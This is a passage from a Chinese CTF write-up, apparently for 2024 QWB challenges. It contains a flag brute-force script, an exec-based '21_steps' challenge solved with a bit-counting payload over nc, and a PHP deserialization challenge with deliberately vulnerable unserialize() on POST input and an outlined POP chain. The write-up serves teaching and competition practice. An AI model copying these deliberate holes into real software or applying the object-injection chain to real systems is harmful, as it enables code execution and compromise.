</span></span><span class=line><span class=cl>        <span class=n>temp</span> <span class=o>=</span> <span class=p>((</span><span class=n>v3</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>v3</span> <span class=o>&gt;&gt;</span> <span class=mi>3</span><span class=p>))</span> <span class=o>^</span> <span class=mh>0xFFFFFFAD</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>        <span class=n>temp2</span> <span class=o>=</span> <span class=p>((</span><span class=n>temp</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>temp</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span><span class=p>))</span> <span class=o>^</span> <span class=mh>0x0FFFFFFDE</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>        <span class=n>temp3</span> <span class=o>=</span> <span class=p>(</span><span class=n>temp2</span> <span class=o>&lt;&lt;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>temp2</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>v14</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>SBox</span><span class=p>[(</span><span class=n>SBox</span><span class=p>[</span><span class=n>v7</span><span class=p>]</span> <span class=o>+</span> <span class=n>v12</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>]</span> <span class=o>^</span> <span class=n>deadbeef</span><span class=p>[</span><span class=n>j</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>]</span> <span class=o>^</span> <span class=n>temp3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>22</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>v14</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^=</span> <span class=n>xor</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>v14</span><span class=p>[:</span><span class=mi>22</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>bomp</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>input_bytes</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=s2>&#34;flag{*********************}&#34;</span><span class=p>,</span> <span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>([</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xC4</span><span class=p>,</span> <span class=mh>0xEE</span><span class=p>,</span> <span class=mh>0x3C</span><span class=p>,</span> <span class=mh>0xBB</span><span class=p>,</span> <span class=mh>0xE7</span><span class=p>,</span> <span class=mh>0xFD</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x1D</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xF8</span><span class=p>,</span> <span class=mh>0x97</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x9D</span><span class=p>,</span> <span class=mh>0x0B</span><span class=p>,</span> <span class=mh>0x7F</span><span class=p>,</span> <span class=mh>0xC7</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xDF</span><span class=p>,</span> <span class=mh>0xF9</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0xA0</span><span class=p>,</span> <span class=mh>0x46</span><span class=p>,</span> <span class=mh>0x91</span>
</span></span><span class=line><span class=cl>    <span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>result</span><span class=p>[</span><span class=mi>7</span><span class=p>],</span> <span class=n>result</span><span class=p>[</span><span class=mi>11</span><span class=p>]</span> <span class=o>=</span> <span class=n>result</span><span class=p>[</span><span class=mi>11</span><span class=p>],</span> <span class=n>result</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span><span class=p>[</span><span class=mi>12</span><span class=p>],</span> <span class=n>result</span><span class=p>[</span><span class=mi>16</span><span class=p>]</span> <span class=o>=</span> <span class=n>result</span><span class=p>[</span><span class=mi>16</span><span class=p>],</span> <span class=n>result</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>256</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>22</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>256</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>input_bytes</span><span class=p>[</span><span class=mi>5</span> <span class=o>+</span> <span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>j</span>
</span></span><span class=line><span class=cl>                <span class=n>encrypted</span> <span class=o>=</span> <span class=n>enc</span><span class=p>(</span><span class=n>input_bytes</span><span class=p>,</span> <span class=n>k</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>result</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=n>encrypted</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>j</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;?&#34;</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bomp</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=21_steps>21_steps</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>secrets</span> <span class=kn>import</span> <span class=n>flag</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Can you weight a 128 bits number in 21 steps&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pattern</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;([AB]|\d+)=([AB]|\d+)(\+|\-|\*|//|&lt;&lt;|&gt;&gt;|&amp;|\^|%)([AB]|\d+)&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>command</span> <span class=o>=</span> <span class=nb>input</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=n>command</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=nb>all</span><span class=p>([</span><span class=n>re</span><span class=o>.</span><span class=n>fullmatch</span><span class=p>(</span><span class=n>pattern</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>command</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;;&#39;</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>step</span> <span class=o>=</span> <span class=mi>21</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>command</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>i</span><span class=o>.</span><span class=n>translate</span><span class=p>(</span><span class=nb>str</span><span class=o>.</span><span class=n>maketrans</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;=AB0123456789&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>t</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span> <span class=s1>&#39;&lt;&lt;&#39;</span><span class=p>,</span> <span class=s1>&#39;+&#39;</span><span class=p>,</span> <span class=s1>&#39;-&#39;</span><span class=p>,</span> <span class=s1>&#39;&amp;&#39;</span><span class=p>,</span> <span class=s1>&#39;^&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=n>step</span> <span class=o>-=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>t</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;*&#39;</span><span class=p>,</span> <span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=s1>&#39;%&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=n>step</span> <span class=o>-=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>step</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>:</span><span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>success</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>w</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=nb>sum</span><span class=p>([</span><span class=nb>int</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>list</span><span class=p>(</span><span class=nb>bin</span><span class=p>(</span><span class=n>x</span><span class=p>)[</span><span class=mi>2</span><span class=p>:])])</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>A</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randrange</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=o>**</span><span class=mi>128</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>wa</span> <span class=o>=</span> <span class=n>w</span><span class=p>(</span><span class=n>A</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>B</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>:</span> <span class=n>exec</span><span class=p>(</span><span class=s2>&#34;global A; global B;&#34;</span> <span class=o>+</span> <span class=n>command</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=p>:</span> <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>A</span> <span class=o>==</span> <span class=n>wa</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>success</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>success</span> <span class=o>==</span> <span class=mi>100</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>先是搞了一个白名单，然后这里继续看规则</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>step</span> <span class=o>=</span> <span class=mi>21</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>command</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>i</span><span class=o>.</span><span class=n>translate</span><span class=p>(</span><span class=nb>str</span><span class=o>.</span><span class=n>maketrans</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;=AB0123456789&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>t</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span> <span class=s1>&#39;&lt;&lt;&#39;</span><span class=p>,</span> <span class=s1>&#39;+&#39;</span><span class=p>,</span> <span class=s1>&#39;-&#39;</span><span class=p>,</span> <span class=s1>&#39;&amp;&#39;</span><span class=p>,</span> <span class=s1>&#39;^&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=n>step</span> <span class=o>-=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>t</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;*&#39;</span><span class=p>,</span> <span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=s1>&#39;%&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=n>step</span> <span class=o>-=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>step</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>:</span><span class=n>exit</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>如果操作符是 <code>>></code>、<code>&lt;&lt;</code>、<code>+</code>、<code>-</code>、<code>&</code> 或 <code>^</code>，则将 <code>step</code> 减少1。</li><li>如果操作符是 <code>*</code>、<code>/</code> 或 <code>%</code>，则将 <code>step</code> 减少3。</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>success = 0
</span></span><span class=line><span class=cl>w = lambda x: sum([int(i) for i in list(bin(x)[2:])])
</span></span><span class=line><span class=cl>for _ in range(100):
</span></span><span class=line><span class=cl>    A = random.randrange(0, 2**128)
</span></span><span class=line><span class=cl>    wa = w(A)
</span></span><span class=line><span class=cl>    B = 0
</span></span><span class=line><span class=cl>    try : exec(&#34;global A; global B;&#34; + command)
</span></span><span class=line><span class=cl>    except : exit()
</span></span><span class=line><span class=cl>    if A == wa:
</span></span><span class=line><span class=cl>        success += 1
</span></span></code></pre></td></tr></table></div></div><p>这段代码的目的是在循环中随机生成128位的数 <code>A</code>，计算其汉明重量，只要进行100次的循环都成功即可，构造payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>B=A&gt;&gt;1;
</span></span><span class=line><span class=cl>B=B&amp;113427455640312821154458202477256070485;
</span></span><span class=line><span class=cl>A=A-B;
</span></span><span class=line><span class=cl>B=A&amp;68056473384187692692674921486353642291;
</span></span><span class=line><span class=cl>A=A&gt;&gt;2;
</span></span><span class=line><span class=cl>A=A&amp;68056473384187692692674921486353642291;
</span></span><span class=line><span class=cl>A=A+B;
</span></span><span class=line><span class=cl>B=A&gt;&gt;4;
</span></span><span class=line><span class=cl>A=A+B;
</span></span><span class=line><span class=cl>A=A&amp;20016609818878733144904388672456953615;
</span></span><span class=line><span class=cl>B=A&gt;&gt;8;
</span></span><span class=line><span class=cl>A=A+B;
</span></span><span class=line><span class=cl>B=A&gt;&gt;16;
</span></span><span class=line><span class=cl>A=A+B;
</span></span><span class=line><span class=cl>B=A&gt;&gt;32;
</span></span><span class=line><span class=cl>A=A+B;
</span></span><span class=line><span class=cl>B=A&gt;&gt;64;
</span></span><span class=line><span class=cl>A=A+B;
</span></span><span class=line><span class=cl>A=A&amp;127;
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# nc 39.106.63.28 32807
</span></span><span class=line><span class=cl>Can you weight a 128 bits number in 21 steps
</span></span><span class=line><span class=cl>B=A&gt;&gt;1;B=B&amp;113427455640312821154458202477256070485;A=A-B;B=A&amp;68056473384187692692674921486353642291;A=A&gt;&gt;2;A=A&amp;68056473384187692692674921486353642291;A=A+B;B=A&gt;&gt;4;A=A+B;A=A&amp;20016609818878733144904388672456953615;B=A&gt;&gt;8;A=A+B;B=A&gt;&gt;16;A=A+B;B=A&gt;&gt;32;A=A+B;B=A&gt;&gt;64;A=A+B;A=A&amp;127;
</span></span><span class=line><span class=cl>flag{you_can_weight_it_in_21_steps!}
</span></span></code></pre></td></tr></table></div></div><h2 id=password-game>Password Game</h2><p>您不满足 Rule 1: 请至少包含数字和大小写字母</p><p>1Ab</p><p>您不满足 Rule 2: 密码中所有数字之和必须为18的倍数</p><p>18Qa</p><p>Rule 2: 密码中所有数字之和必须为30的倍数</p><p>540Qa</p><p>您不满足 Rule 2: 密码中所有数字之和必须为20的倍数</p><p>5150Qa</p><p>您不满足 Rule 2: 密码中所有数字之和必须为28的倍数</p><p>54019Qa</p><p>密码中所有数字之和必须为12的倍数</p><p>54519Qa</p><p>您不满足 Rule 2: 密码中所有数字之和必须为14的倍数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>filter</span><span class=p>(</span><span class=nv>$password</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filter_arr</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;admin&#34;</span><span class=p>,</span><span class=s2>&#34;2024qwb&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filter</span> <span class=o>=</span> <span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nx>implode</span><span class=p>(</span><span class=s2>&#34;|&#34;</span><span class=p>,</span><span class=nv>$filter_arr</span><span class=p>)</span><span class=o>.</span><span class=s1>&#39;/i&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=nv>$filter</span><span class=p>,</span><span class=s2>&#34;nonono&#34;</span><span class=p>,</span><span class=nv>$password</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>guest</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__tostring</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>==</span><span class=s2>&#34;guest&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$value</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$key</span><span class=p>,</span><span class=nv>$value</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>==</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;flag&#34;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;flag&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>root</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$key</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=p>,</span> <span class=s2>&#34;admin&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>value</span> <span class=o>==</span> <span class=s2>&#34;2024qwb&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>value</span> <span class=o>=</span> <span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;flag&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nx>md5</span><span class=p>(</span><span class=s2>&#34;hello:&#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>user</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$password</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>=</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;flag&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=o>-&gt;</span><span class=na>guess</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=p>,</span> <span class=s2>&#34;admin&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;hello&#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$user</span><span class=o>=</span><span class=nx>unserialize</span><span class=p>(</span><span class=nx>filter</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;password&#34;</span><span class=p>]));</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$user</span><span class=o>-&gt;</span><span class=na>username</span><span class=p>,</span> <span class=s2>&#34;admin&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>password</span> <span class=o>==</span> <span class=s2>&#34;2024qwb&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;hello!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>pop链子</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>user::destruct-&gt;guest::toString-&gt;user::invoke-&gt;guest::call
